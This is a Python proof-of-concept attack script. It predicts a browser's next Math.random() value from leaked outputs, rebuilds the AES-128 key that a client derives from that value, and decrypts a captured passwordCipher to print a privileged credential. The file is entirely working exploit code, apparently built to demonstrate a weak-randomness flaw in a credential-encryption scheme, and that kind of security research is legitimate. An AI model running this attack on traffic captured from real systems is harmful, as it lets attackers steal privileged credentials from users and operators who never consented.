#!/usr/bin/env python3
# Attacker: given only `observed` Math.random() values + the captured
# `passwordCipher`, predict the AES key and recover the privileged credential.
# Does NOT use keyCipher or the server RSA private key.
import json, subprocess, sys
from predict import predict_future
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

cap = json.load(open(sys.argv[1] if len(sys.argv) > 1 else "capture.json"))
observed = cap["observed"]
password_cipher_b64 = cap["passwordCipher"]

# 1) Predict the next Math.random() output — the one used to build the AES key.
r_key = predict_future(observed, 1)[0]

# 2) Reproduce aesKey = (r_key + 1).toString(36).substring(2) with V8's exact
#    base-36 float formatting (deterministic, public transform).
aes_key = subprocess.check_output(
    ["node", "-e", f"process.stdout.write((({r_key!r})+1).toString(36).substring(2))"]
).decode()

# 3) fillKey -> 16-byte AES-128 key (truncate/zero-pad), AES-ECB decrypt, strip zero pad.
kb = aes_key.encode()[:16]
key = kb + b"\x00" * (16 - len(kb))
ct = __import__("base64").b64decode(password_cipher_b64)
dec = Cipher(algorithms.AES(key), modes.ECB()).decryptor()
pt = (dec.update(ct) + dec.finalize()).rstrip(b"\x00").decode("utf-8", "replace")

print(f"[*] observed Math.random (leaked): {[round(x,6) for x in observed]}")
print(f"[*] predicted key-stream value   : {r_key!r}")
print(f"[+] reconstructed AES key        : {aes_key!r}")
print(f"[+] RECOVERED CREDENTIAL          : {pt!r}")
if "_debug" in cap:
    exp = cap["_debug"]["secret"]
    print(f"[=] actual credential            : {exp!r}")
    print("RESULT:", "CREDENTIAL RECOVERED — PoC SUCCESS" if pt == exp else "mismatch")
